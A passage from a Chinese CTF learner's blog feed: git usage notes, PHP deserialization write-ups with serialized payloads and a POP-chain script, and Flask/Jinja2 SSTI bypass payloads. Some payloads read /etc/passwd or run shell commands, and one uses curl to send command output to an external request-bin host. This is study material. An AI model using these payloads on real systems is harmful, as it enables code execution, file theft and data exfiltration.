src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTA5MzI2MTItMTQ3ODE2MTQ3NC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>连接github，打开GitHub 进入setting找到ssh key并新建</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/github%E4%BD%BF%E7%94%A8/format,png.png" alt="img">format,png.png)</p><p>然后测试连接是否成功</p><p>输入: ssh -T <a href="mailto:&#103;&#x69;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;">&#103;&#x69;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;</a> </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvNzc0ODI0LzIwMTkwNy83NzQ4MjQtMjAxOTA3MTExNTI1MDg3MzYtNDUwMTA1MTMwLnBuZw?x-oss-process=image/format,png" alt="img"></p><p><strong>上传</strong></p><p>上传的基本步骤就是这样了</p><p>先打开一个文件夹按着图片里的步骤来</p><p>先初始化再把想传的文件传上去</p><p>可以用git add .上传所有文件</p><pre class="language-none"><code class="language-none">注：输入git add .后如果报错warning: LF will be replaced by CRLF in gradlew.The file will have its original line endings in your working directory则再输入git config --global core.autocrlf false后再重新输入git add .命令即可</code></pre><p>git commit添加备注</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/github%E4%BD%BF%E7%94%A8/image-20211002123234287.png" alt="image-20211002123234287"></p><p>克隆仓库</p><pre class="language-console" data-language="console"><code class="language-console">$ git clone 网址 [自定义目录名]</code></pre><p>可以用https://或git://或ssh传输协议</p><p>查看连接的仓库地址</p><pre class="language-none"><code class="language-none">git remote -v</code></pre><p>如果在另外的文件夹提交需重新进行一遍图中步骤</p><p>还要再push前输入</p><pre class="language-none"><code class="language-none">git pull --rebase origin main</code></pre><p>该命令的意思是把远程库中的<strong>更新合并</strong>到（<strong>pull=fetch+merge</strong>）本地库中，<strong>–-rebase</strong>的作用是取消掉本地库中刚刚的commit，并把他们<strong>接到</strong>更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。</p><p>否则就会因为本地库与远程库不一致导致报错</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/github%E4%BD%BF%E7%94%A8/image-20211002130237512.png" alt="image-20211002130237512"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>总结</title>
      <link href="/2021/08/31/%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/31/%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3d2af7c13645b12e108ebfa9ae9f9d93df2797ece5065202e5e1d850046acf6f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">猜猜看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>php的序列化和反序列化主要是通过serialize和unserialize两个函数</p><p>serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法</p> <span id="more"></span><p>几个常见的魔术方法</p><pre class="language-none"><code class="language-none">__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep:序列化对象之前就调用此方法(其返回需要一个数组)__wakeup:反序列化恢复对象之前调用该方法__call:当调用对象中不存在的方法会自动调用该方法。__get:在调用私有属性的时候会自动执行__isset()在不可访问的属性上调用isset()或empty()触发__invoke()当尝试把对象当方法调用时调用。__unset()在不可访问的属性上使用unset()时触发</code></pre><p>格式</p><pre class="language-none"><code class="language-none">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</code></pre><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>private类型有隐藏的空格符</p><p><strong>反序列化的常见起点</strong></p><p>__wakeup 一定会调用</p><p>__destruct 一定会调用</p><p>__toString 当一个对象被反序列化后又被当做字符串使用</p><p><strong>反序列化的常见中间跳板:</strong></p><p>__toString 当一个对象被当做字符串使用<br>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用<br>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p><p><strong>反序列化的常见终点:</strong></p><p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p><h3 id="POP链简介"><a href="#POP链简介" class="headerlink" title="POP链简介"></a><strong>POP链简介</strong></h3><p>借鉴的文章：</p><p><a href="https://www.jianshu.com/p/16c56bebc63d">php反序列化利用——POP链构造实例 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/105265462">(1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链</a></p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p><h3 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h3><p>1、一些有用的POP链中出现的方法：</p><pre class="language-php" data-language="php"><code class="language-php">- 命令执行：exec()、passthru()、popen()、system()- 文件操作：file_put_contents()、file_get_contents()、unlink()</code></pre><p>2、<strong>反序列化中为了避免信息丢失，使用大写S支持字符串的编码。</strong>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre><p>3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br> 4、配合PHP伪协议实现文件包含、命令执行等漏洞。</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>先贴俩之前写的简单的</p><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p><p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p><p>再利用php://filter读取useless内的内容</p><p>解码后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501183046395.png" alt="image-20210501183046395"></p><p>可知flag在flag.php中</p><p>试图让file=flag.php</p><p>看到unserialize函数，利用php反序列化</p><p>构造payload</p><p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205224647.png" alt="image-20210501205224647"></p><p>查看源码找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501205239104.png" alt="image-20210501205239104"></p><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>页面中提示有备份文件，御剑扫一遍</p><p>找到存在<a href="http://www.zip/">www.zip</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220739803.png" alt="image-20210501220739803"></p><p>重点在class.php和index.php中</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220857753.png" alt="image-20210501220857753"></p><p>所以要传入一个select参数，利用反序列化让username=admin</p><p>password=100</p><p>因为username和password两个为private类型</p><p>所以有隐藏的空格符</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501220212731.png" alt="image-20210501220212731"></p><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>题目源码</p><pre class="language-php" data-language="php"><code class="language-php">class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;</code></pre><p>题目里出现的魔术变量</p><pre class="language-none"><code class="language-none">__construct   当一个对象创建时被调用，__toString   当一个对象被当作一个字符串被调用。__wakeup()   使用unserialize时触发__get()    用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke()   当脚本尝试将对象调用为函数时触发</code></pre><p>这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_</p><p>__<em>wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用</em>__toString</p><p>这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数，</p><p><em>这里也就会触发</em>__invoke()，进而调用append</p><p>在append的中存在include，所以可以利用文件包含漏洞读到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003613462.png" alt="image-20210704003613462"></p><p>payload</p><p>（自己写一个还是有点困难</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Modifier&#123;    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;    &#125;&#125;class Test&#123;    public $p;&#125;$a &#x3D; new Show(&#39;aaa&#39;);$a-&gt;str &#x3D; new Test();$a-&gt;str-&gt;p &#x3D; new Modifier();$b &#x3D; new Show($a);echo urlencode(serialize($b));</code></pre><p>base64解码拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704003713873.png" alt="image-20210704003713873"></p><h3 id="CODE-REVIEW"><a href="#CODE-REVIEW" class="headerlink" title="CODE REVIEW"></a>CODE REVIEW</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705135850186.png" alt="image-20210705135850186"></p><p>代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞</p><p>且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag</p><p>这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null</p><p>而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法</p><p>构造payload</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141338826.png" alt="image-20210705141338826"></p><p>//uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。</p><p>//传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。</p><p>//引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。</p><p>所以最终payload为</p><p>get内容为：?pleaseget=1</p><p>post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</p><p>拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705141616910.png" alt="image-20210705141616910"></p><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#125;</code></pre><p>看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取</p><p>在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内</p><p>之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容</p><p>构造payload</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150325057.png" alt="image-20210705150325057"></p><p>这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p><pre class="language-php" data-language="php"><code class="language-php">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></pre><p>（刚开始给op赋了个字符型的“2”，找错找了半天。。。</p><p>拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150240715.png" alt="image-20210705150240715"></p><p>接下来base64解码就可以拿到flag了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210705150647307.png" alt="image-20210705150647307"></p><p>这周划水了（</p><p>忙着学科目三了，周三考完试再补点（</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210704004536648.png" alt="image-20210704004536648"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti模板注入</title>
      <link href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p> 不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。</p> <span id="more"></span><h2 id="ssti概述"><a href="#ssti概述" class="headerlink" title="ssti概述"></a>ssti概述</h2><p>贴个大佬的文章</p><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</a></p><p>[关于python魔术方法payload：““.<strong>class</strong>.<strong>mro</strong><a href="https://blog.csdn.net/xiao__1bai/article/details/115672392">2].<strong>subclasses</strong>()<a href="%E2%80%9C/etc/passwd%E2%80%9C">40</a>.read() 的解释_xiao__1bai的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">模板注入总结_Herbert_555的博客-CSDN博客</a></p><p>SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；<br>漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。</p><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><pre class="language-python" data-language="python"><code class="language-python">__dict__ 保存类实例或对象实例的属性变量键值对字典__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__bases__   返回该对象所继承的基类&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre><p><strong>flask基本知识</strong></p><p>flask采用装饰器来指定路由，默认的模板渲染引擎为<strong>Jinja2</strong>。其中模板的三种主要语法为</p><ul><li>：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值</li><li>{ % … % }:装载一个控制语句</li><li>:装载一个注释</li></ul><p><strong>流程：</strong></p><ol><li><p>​    获取基本类</p></li><li><p>​    获取基本类的子类</p></li><li><p>​    找到重载过的<code>__init__</code>类</p></li><li><p>​    查看其引用<code>__builtins__</code></p></li><li><p>​    调用其中可用的函数</p></li></ol><p><strong>获取基本类</strong></p><p>​        利用<code>__bases__</code>或者是<code>__mro__</code>函数</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用</code></pre><p>//实话实说最后一个不是很懂</p><p><strong>获取基类的子类</strong></p><p>​    利用<code>__subclasses__</code>函数</p><pre class="language-python" data-language="python"><code class="language-python">object.__subclasses__()&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类</code></pre><p>SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用</p><p>我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号）</p><p><strong>找到重载过的<code>__init__</code>类</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__</code></pre><p> <strong>查看其引用<code>__builtins__</code></strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre><p><strong>使用os模块执行命令来读取flag</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)</code></pre><p><strong>来、姿势</strong></p><p><strong>1、config</strong></p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前</p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p><p><strong>2、self</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</code></pre><p><strong>3、&quot;&quot;、[]、()等数据结构</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p><p><strong>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</strong></p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p><p>例如：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</code></pre><p><strong>常见的过滤绕过</strong></p><p><strong>(1)只过滤<code>[]</code></strong></p><blockquote><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code><br>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p></blockquote><p><strong>(2)过滤_</strong></p><p>利用<code>request.args</code>属性<br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code><br>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p><p><strong>(3)关键字过滤</strong></p><ul><li>base64编码绕过<br><code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>例如被过滤掉<code>__class__</code>关键词<br><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></p><ul><li>字符串拼接绕过<br><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code><br><code>&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125;</code></li></ul><p><strong>(4)过滤{ {</strong></p><p>使用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>，例如</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; |  grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125;</code></pre><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre><p><strong>(5)引号内十六进制绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&quot;&quot;.__class__&#125;&#125;&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;_&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre><p><strong>(6)&quot; &#39; chr等被过滤，无法引入字符串</strong></p><ul><li>直接拼接键名</li></ul><pre class="language-python" data-language="python"><code class="language-python">dict(buil&#x3D;aa,tins&#x3D;dd)|join()</code></pre><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><pre class="language-python" data-language="python"><code class="language-python">(app.__doc__|list()).pop(102)|string()</code></pre><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><pre class="language-python" data-language="python"><code class="language-python">&#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join 